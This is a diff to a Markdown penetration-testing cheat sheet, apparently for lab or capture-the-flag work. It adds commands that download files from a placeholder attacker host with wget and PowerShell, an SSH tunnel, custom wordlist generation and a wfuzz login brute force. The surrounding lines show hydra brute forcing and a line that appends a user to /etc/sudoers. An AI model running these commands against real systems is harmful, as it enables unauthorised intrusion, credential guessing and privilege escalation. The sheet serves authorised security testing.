@@ -40,8 +40,14 @@ dnsrecon -d <TARGET_DOMAIN> -n <TARGET_IP>
 python -m http.server
 ```
 
+## File Transfer
+
 ```bash
 wget http://<ATTACKER_IP>:8000/<FILE_NAME>
+```
+
+```bash
+powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/<FILE_NAME>' -OutFile '<FILE_NAME>'"
 ```
 
 ## Netcat File Transfer
@@ -105,6 +111,13 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 echo 'echo "<USER_NAME> ALL=(ALL:ALL) ALL" >> /etc/sudoers;' >> <FILE_NAME>
 ```
 
+## Port Analysis and Network Tunneling
+
+```bash
+ss -tulpn
+ssh -L <PORT>:localhost:<PORT> <USER_NAME>@<TARGET_IP>
+```
+
 # Windows Privilege Escalation and System Commands
 
 ## Privilege and Permission Analysis
@@ -157,6 +170,14 @@ sed -i 's/CS_ARCH_ARM64/CS_ARCH_AARCH64/g' /usr/lib/python3/dist-packages/binwal
 crunch 18 18 -t '@@@@' > file.txt
 ```
 
+```bash
+cewl http://<TARGET_IP> > initial-list
+```
+
+```bash
+john -w=initial-list --rules --stdout > password-list
+```
+
 ## Network Service Brute Force Attacks
 
 ```bash
@@ -177,6 +198,10 @@ hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form 
 
 ```bash
 hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 32
+```
+
+```bash
+wfuzz -w /usr/share/wordlists/rockyou.txt -X POST -d '{"username":"<LOGIN>","password":"FUZZ"}' -u http://<TARGET_IP>/login
 ```
 
 ```bash
